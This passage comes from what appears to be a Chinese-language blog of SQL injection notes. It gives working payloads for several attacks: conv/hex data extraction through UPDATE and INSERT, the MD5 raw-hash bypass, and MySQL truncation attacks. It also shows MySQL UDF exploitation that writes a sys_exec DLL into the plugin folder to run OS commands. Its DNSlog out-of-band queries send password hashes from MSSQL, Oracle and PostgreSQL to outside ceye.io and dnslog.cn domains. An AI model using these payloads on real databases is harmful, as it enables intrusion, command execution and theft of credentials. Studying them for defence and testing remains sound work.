class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span><span class="hljs-operator">*</span>n)), <span class="hljs-number">16</span>, <span class="hljs-number">10</span>);</code></pre></div></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210220211648286.png" alt="image-20210220211648286"></p><ul><li><p>获取列名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> conv(hex(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>’Name <span class="hljs-keyword">of</span> your <span class="hljs-keyword">table</span>’ limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span> <span class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span><span class="hljs-operator">*</span>n)), <span class="hljs-number">16</span>, <span class="hljs-number">10</span>);</code></pre></div></li><li><p>利用update语句</p><div class="hljs code-wrapper"><pre><code class="hljs sql">update users <span class="hljs-keyword">set</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-operator">|</span> conv(hex(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span> <span class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span> <span class="hljs-operator">*</span> n)), <span class="hljs-number">16</span>, <span class="hljs-number">10</span>) <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">16</span></code></pre></div></li><li><p>利用 INSERT语句</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span> (<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;james&#x27;</span>, <span class="hljs-string">&#x27;bond&#x27;</span>);</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users <span class="hljs-keyword">values</span> (<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;james&#x27;</span>, <span class="hljs-string">&#x27;bond&#x27;</span><span class="hljs-operator">|</span>conv(hex(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span> <span class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span><span class="hljs-operator">*</span> n)),<span class="hljs-number">16</span>, <span class="hljs-number">10</span>);</code></pre></div></li><li><p>Mysql 5.7中的限制</p><div class="hljs code-wrapper"><pre><code class="hljs sql">update users <span class="hljs-keyword">set</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-operator">|</span> conv(hex(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span> <span class="hljs-operator">+</span> (n<span class="hljs-number">-1</span>) <span class="hljs-operator">*</span> <span class="hljs-number">8</span>, <span class="hljs-number">8</span> <span class="hljs-operator">*</span> n)), <span class="hljs-number">16</span>, <span class="hljs-number">10</span>) <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">16</span></code></pre></div></li><li><p>编码解码</p><div class="hljs code-wrapper"><pre><code class="hljs sql">conv(hex(<span class="hljs-keyword">value</span>, <span class="hljs-number">16</span>, <span class="hljs-number">10</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> unhex(conv(<span class="hljs-keyword">value</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>));</code></pre></div></li></ul><h2 id="1-13-MD5哈希注入"><a href="#1-13-MD5哈希注入" class="headerlink" title="1.13 MD5哈希注入"></a>1.13 MD5哈希注入</h2><div class="hljs code-wrapper"><pre><code class="hljs mysql">$sql &#x3D; &quot;SELECT * FROM admin WHERE pass &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code></pre></div><p><strong>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p><div class="hljs code-wrapper"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">ffifdyop</span>    --&gt;</span> <span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-function"><span class="hljs-title">esvh</span>        --&gt;</span> <span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">129581926211651571912466741651878684928</span> --&gt; <span class="hljs-string">&#x27;or&#x27;</span></code></pre></div><blockquote><blockquote><p><a href="https://bbs.ichunqiu.com/article-1766-1.html">https://bbs.ichunqiu.com/article-1766-1.html</a></p></blockquote></blockquote><h2 id="1-14-show-columns-注入-尚未解决"><a href="#1-14-show-columns-注入-尚未解决" class="headerlink" title="1.14 show columns 注入  尚未解决"></a>1.14 show columns 注入  尚未解决</h2><h2 id="1-15-Mysql约束攻击"><a href="#1-15-Mysql约束攻击" class="headerlink" title="1.15 Mysql约束攻击"></a>1.15 Mysql约束攻击</h2><ul><li>参考</li></ul><blockquote><blockquote><p><a href="http://www.goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/">http://www.goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/</a></p></blockquote></blockquote><ul><li><p>条件限制</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">服务端没有对用户名长度进行限制登陆验证的<span class="hljs-keyword">SQL</span>语句必须是用户名和密码一起验证验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名</code></pre></div></li><li><p>攻击原理</p><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">INSERT</span>截断:当设计一个字段时，我们都必须对其设定一个最大长度，比如<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">CHAR</span></span>(<span class="hljs-number">10</span>)，<span class="hljs-title">VARCHAR</span>(<span class="hljs-number">20</span>)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs arduino">在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[<span class="hljs-keyword">String</span>]和字符串B:[String2]进行比较时，由于String2比<span class="hljs-keyword">String</span>多了一个字符串，这时MySQL会将字符串A填充为[<span class="hljs-keyword">String</span> ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。</code></pre></div></li><li><p>服务端代码</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT username FROM users</span><span class="hljs-string">      WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;</span><span class="hljs-string">          AND password=&#x27;<span class="hljs-subst">$password</span>&#x27; &quot;</span>;<span class="hljs-variable">$res</span> = mysql_query(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$database</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) &#123;<span class="hljs-keyword">if</span>(mysql_num_rows(<span class="hljs-variable">$res</span>) &gt; <span class="hljs-number">0</span>)&#123;  <span class="hljs-keyword">return</span> <span class="hljs-variable">$username</span>;<span class="hljs-comment">//此处较原文有改动</span>&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">Null</span>;<span class="hljs-meta">?&gt;</span></code></pre></div></li><li><p>攻击</p><div class="hljs code-wrapper"><pre><code class="hljs bash">注册一个[Dumb          <span class="hljs-keyword">done</span>]的用户</code></pre></div></li></ul><h2 id="1-16-MySQL-UDF-Exploitation"><a href="#1-16-MySQL-UDF-Exploitation" class="headerlink" title="1.16 MySQL UDF Exploitation"></a>1.16 MySQL UDF Exploitation</h2><blockquote><blockquote><p><a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/">https://osandamalith.com/2018/02/11/mysql-udf-exploitation/</a></p></blockquote></blockquote><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> host, <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">from</span> mysql.user;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155113317.png" alt="image-20210313155113317"></p><div class="hljs code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = substring_index(<span class="hljs-keyword">user</span>(), <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-number">1</span>) ;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155121122.png" alt="image-20210313155121122"></p><ul><li><p>dll下载地址</p><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rapid7/m</span>etasploit-framework<span class="hljs-regexp">/tree/m</span>aster<span class="hljs-regexp">/data/</span>exploits/mysql</code></pre></div></li><li><p>获取当前操作系统以及数据库架构情况</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>_compile_os, @<span class="hljs-variable">@version</span>_compile_machine<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%compile%&#x27;</span>;</code></pre></div></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155128399.png" alt="image-20210313155128399"></p><ul><li>查找plugin文件夹</li></ul><p><strong>MySQL 5.0.67以后udf.dll必须位于plugin文件夹</strong></p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@plugin</span>_dir ;<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;plugin%&#x27;</span>;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155150965.png" alt="image-20210313155150965"></p><ul><li><p>旧版本可以使用目录</p><div class="hljs code-wrapper"><pre><code class="hljs less">@<span class="hljs-variable">@datadir</span><span class="hljs-variable">@@basedir</span>\bin<span class="hljs-attribute">C</span>:\windows<span class="hljs-attribute">C</span>:\windows\system<span class="hljs-attribute">C</span>:\windows\system32</code></pre></div></li></ul><h3 id="上传二进制文件"><a href="#上传二进制文件" class="headerlink" title="上传二进制文件"></a>上传二进制文件</h3><ul><li><p>网络共享</p><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">select</span> <span class="hljs-string">load_file(&#x27;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span></code></pre></div></li><li><p>十六进制编码</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">select hex(load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">usr</span><span class="hljs-operator">/</span><span class="hljs-params">share</span><span class="hljs-operator">/</span><span class="hljs-params">metasploit</span>-<span class="hljs-params">framework</span><span class="hljs-operator">/</span><span class="hljs-params">data</span><span class="hljs-operator">/</span><span class="hljs-params">exploits</span><span class="hljs-operator">/</span><span class="hljs-params">mysql</span><span class="hljs-operator">/</span><span class="hljs-params">lib_mysqludf_sys_64</span>.<span class="hljs-params">dll</span>&#x27;)</span>) into dumpfile &#x27;/tmp/udf.hex&#x27;;select <span class="hljs-number">0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000</span>… into dump file <span class="hljs-string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</code></pre></div></li><li><p>创建表拼接</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">create</span> table temp(data longblob);<span class="hljs-attribute">insert</span> into temp(data) values (<span class="hljs-number">0</span>x<span class="hljs-number">4</span>d<span class="hljs-number">5</span>a<span class="hljs-number">90000300000004000000</span>ffff<span class="hljs-number">0000</span>b<span class="hljs-number">800000000000000400000000000000000000000000000000000000000000000000000000000000000000000</span>f<span class="hljs-number">00000000</span>e<span class="hljs-number">1</span>fba<span class="hljs-number">0</span>e<span class="hljs-number">00</span>b<span class="hljs-number">409</span>cd<span class="hljs-number">21</span>b<span class="hljs-number">8014</span>ccd<span class="hljs-number">21546869732070726</span>f<span class="hljs-number">6772616</span>d<span class="hljs-number">2063616</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>f<span class="hljs-number">742062652072756</span>e<span class="hljs-number">20696</span>e<span class="hljs-number">20444</span>f<span class="hljs-number">53206</span>d<span class="hljs-number">6</span>f<span class="hljs-number">64652</span>e<span class="hljs-number">0</span>d<span class="hljs-number">0</span>d<span class="hljs-number">0</span>a<span class="hljs-number">2400000000000000000000000000000</span>);<span class="hljs-attribute">update</span> temp set data = concat(data,<span class="hljs-number">0</span>x<span class="hljs-number">33</span>c<span class="hljs-number">2</span>ede<span class="hljs-number">077</span>a<span class="hljs-number">383</span>b<span class="hljs-number">377</span>a<span class="hljs-number">383</span>b<span class="hljs-number">377</span>a<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">110</span>b<span class="hljs-number">375</span>a<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">100</span>b<span class="hljs-number">37</span>da<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">107</span>b<span class="hljs-number">375</span>a<span class="hljs-number">383</span>b<span class="hljs-number">35065</span>f<span class="hljs-number">8</span>b<span class="hljs-number">374</span>a<span class="hljs-number">383</span>b<span class="hljs-number">377</span>a<span class="hljs-number">382</span>b<span class="hljs-number">35</span>ba<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">10</span>ab<span class="hljs-number">376</span>a<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">116</span>b<span class="hljs-number">375</span>a<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">111</span>b<span class="hljs-number">376</span>a<span class="hljs-number">383</span>b<span class="hljs-number">369</span>f<span class="hljs-number">112</span>b<span class="hljs-number">376</span>a<span class="hljs-number">383</span>b<span class="hljs-number">35269636877</span>a<span class="hljs-number">383</span>b<span class="hljs-number">300000000000000000000000000000000504500006486060070</span>b<span class="hljs-number">1834</span>b<span class="hljs-number">00000000</span>);<span class="hljs-attribute">select</span> data from temp into dump file <span class="hljs-string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</code></pre></div></li><li><p>MySQL 5.6.1/MariaDB 10.0.5</p></li></ul><p><strong>to_base64和from_base64函数</strong></p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">select <span class="hljs-keyword">to</span><span class="hljs-constructor">_base64(<span class="hljs-params">load_file</span>(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">usr</span><span class="hljs-operator">/</span><span class="hljs-params">share</span><span class="hljs-operator">/</span><span class="hljs-params">metasploit</span>-<span class="hljs-params">framework</span><span class="hljs-operator">/</span><span class="hljs-params">data</span><span class="hljs-operator">/</span><span class="hljs-params">exploits</span><span class="hljs-operator">/</span><span class="hljs-params">mysql</span><span class="hljs-operator">/</span><span class="hljs-params">lib_mysqludf_sys_64</span>.<span class="hljs-params">dll</span>&#x27;)</span>) into dumpfile &#x27;/tmp/udf.b64&#x27;;</code></pre></div><p><strong>编辑base64文件并通过以下方式将其dump到插件目录</strong></p><div class="hljs code-wrapper"><pre><code class="hljs lsl">select from_base64(<span class="hljs-string">&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="hljs-string">AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v</span><span class="hljs-string">ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4</span><span class="hljs-string">s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA</span><span class="hljs-string">AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA</span><span class="hljs-string">EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA</span><span class="hljs-string">AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA</span><span class="hljs-string">AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="hljs-string">AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR</span><span class="hljs-string">EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;</span>) into dumpfile <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>MySQL<span class="hljs-subst">\\</span>mysql-5.7.21-winx64<span class="hljs-subst">\\</span>mysql-5.7.21-winx64<span class="hljs-subst">\\</span>lib<span class="hljs-subst">\\</span>plugin<span class="hljs-subst">\\</span>udf.dll&quot;</span>;</code></pre></div><h3 id="DLL使用"><a href="#DLL使用" class="headerlink" title="DLL使用"></a>DLL使用</h3><ul><li><p>查找到mysql的目录</p><div class="hljs code-wrapper"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> @<span class="hljs-symbol">@basedir</span><span class="hljs-comment">;</span></code></pre></div></li><li><p>创建文件夹（没测试成功）</p><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">//利用NTFS ADS创建lib目录</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;    <span class="hljs-comment">//利用NTFS ADS创建plugin目录</span></code></pre></div></li><li><p>改变plugin目录位置</p><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">mysqld.exe</span> <span class="hljs-string">–plugin-dir=C:\\temp\\plugins\\</span></code></pre></div></li><li><p>上传dll</p></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155159720.png" alt="image-20210313155159720"></p><ul><li><p>安装</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_exec <span class="hljs-keyword">returns</span> <span class="hljs-type">int</span> soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;</code></pre></div></li><li><p>验证</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_exec&#x27;</span>;</code></pre></div></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155205931.png" alt="image-20210313155205931"></p><ul><li><p>删除</p><div class="hljs code-wrapper"><pre><code class="hljs ada">drop <span class="hljs-keyword">function</span> <span class="hljs-title">sys_exec;</span></code></pre></div></li><li><p>执行</p><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_exec</span>(<span class="hljs-params"><span class="hljs-string">&#x27;cmd&#x27;</span></span>)</span>;</code></pre></div></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155213007.png" alt="image-20210313155213007"></p><h2 id="1-17-DNSlog带外"><a href="#1-17-DNSlog带外" class="headerlink" title="1.17 DNSlog带外"></a>1.17 DNSlog带外</h2><p>参考资料：</p><ul><li><p><a href="http://www.secwk.com/2019/10/13/10559/">利用DNS实现SQL注入带外查询</a></p></li><li><p><a href="https://baynk.blog.csdn.net/article/details/105214129">SQL注入之利用DNSlog外带盲注回显</a></p></li><li><p><a href="https://blog.csdn.net/cxrpty/article/details/104255459">sql注入——dns的带外注入</a></p></li><li><p><a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战</a></p></li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210313155233482.png" alt="image-20210313155233482"></p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。</p><p>当我们发现一个站点存在一个没有数据回显的注入点进行注入时，只能采取盲注，这种注入速度非常慢，需要一个一个字符猜解，而且很容易被网站BAN掉IP，虽然也可以使用代理IP池，但是还是需要一种快速有效的方法来获取数据。</p><p>此时我们就可以利用DNSlog来快速的获取数据，当然我们也可以在无回显的命令执行或者无回显的SSRF中利用。</p><h4 id="DNSlog利用条件"><a href="#DNSlog利用条件" class="headerlink" title="DNSlog利用条件"></a>DNSlog利用条件</h4><p>DBMS中需要有可用的，能直接或间接引发DNS解析过程的子程序，即使用到UNC</p><p><strong>Linux没有UNC路径，所以当处于Linux系统时，不能使用该方式获取数据</strong><br>前人总结不同DBMS中使用的方法：</p><p><strong>Microsoft SQL Server</strong></p><p>master…xp_dirtree (用于获取所有文件夹的列表和给定文件夹内部的子文件夹）</p><p>master…xp_fileexist (用于确定一个特定的文件是否存在于硬盘)</p><p>master…xp_subdirs (用于得到给定的文件夹内的文件夹列表)</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@host</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">SELECT</span> <span class="hljs-variable">@host</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> TOP <span class="hljs-number">1</span>master.dbo.fn_varbintohexstr(password_hash)<span class="hljs-keyword">FROM</span> sys.sql_loginsWHERE name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sa&#x27;</span>)<span class="hljs-operator">+</span><span class="hljs-string">&#x27;.ip.port.b182oj.ceye.io&#x27;</span>;<span class="hljs-keyword">EXEC</span>(<span class="hljs-string">&#x27;master..xp_dirtree&quot;\&#x27;</span><span class="hljs-operator">+</span><span class="hljs-variable">@host</span><span class="hljs-operator">+</span><span class="hljs-string">&#x27;\foobar$&quot;&#x27;</span>);</code></pre></div><p>Oracle</p><p>Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。</p><ul><li>GET_HOST_ADDRES (用于检索特定主机的IP)</li></ul><ul><li>UTL_HTTP.REQUEST (从给定的地址检索到的第1-2000字节的数据)</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> UTL_HTTP.REQUEST((<span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;.nk40ci.ceye.io&#x27;</span>) <span class="hljs-keyword">FROM</span> sys.DUAL;</code></pre></div><ul><li>DBMS_LDAP.INIT</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> DBMS_LDAP.INIT((<span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;.nk40ci.ceye.io&#x27;</span>,<span class="hljs-number">80</span>) <span class="hljs-keyword">FROM</span> sys.DUAL;</code></pre></div><ul><li>HTTPURITYPE</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> HTTPURITYPE((<span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;.xx.nk40ci.ceye.io&#x27;</span>).GETCLOB() <span class="hljs-keyword">FROM</span> sys.DUAL;</code></pre></div><ul><li>UTL_INADDR.GET_HOST_ADDRESS</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS((<span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> test_user <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;.ddd.nk40ci.ceye.io&#x27;</span>) <span class="hljs-keyword">FROM</span> sys.DUAL;</code></pre></div><p><strong>Mysql</strong></p><p><strong>load_file</strong> (读取文件内容并将其作为字符串返回)</p><p><code>load_file()</code>函数的，它需要当前数据库用户有读权限，并且需要设置<code>secure_file_priv</code>。</p><p><strong>PostgreSQL</strong></p><p>COPY (用于在文件系统的文件和表之间拷贝数据)</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> table_output;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table_output(content text);<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">FUNCTION</span> temp_function()<span class="hljs-keyword">RETURNS</span> VOID <span class="hljs-keyword">AS</span> $$<span class="hljs-keyword">DECLARE</span> exec_cmd TEXT;<span class="hljs-keyword">DECLARE</span> query_result TEXT;BEGINSELECT <span class="hljs-keyword">INTO</span> query_result (<span class="hljs-keyword">SELECT</span> passwdFROM pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>);exec_cmd :<span class="hljs-operator">=</span> E<span class="hljs-string">&#x27;COPY table_output(content)FROM E\&#x27;</span>\\\\<span class="hljs-string">&#x27;||query_result||E&#x27;</span>.postgreSQL.nk40ci.ceye.io\\foobar.txt\<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">EXECUTE</span> exec_cmd;<span class="hljs-keyword">END</span>;$$ <span class="hljs-keyword">LANGUAGE</span> plpgSQL SECURITY DEFINER;<span class="hljs-keyword">SELECT</span> temp_function();</code></pre></div><h4 id="UNC"><a href="#UNC" class="headerlink" title="UNC"></a>UNC</h4><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器.。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径</p><p>格式： \servername\sharename ，其中 servername 是服务器名，sharename 是共享资源的名称。<br>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename</p><p>loadfile的路径使用UNC方式：</p><p>payload：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">admin<span class="hljs-string">&quot; union select load_file(concat(&#x27;\\\\&#x27;,(select hex(database())),&#x27;.g5ucgd.dnslog.cn\\test&#x27;))#</span></code></pre></div><ul><li><code>\\\\</code>转义后即为<code>\\</code></li><li>select 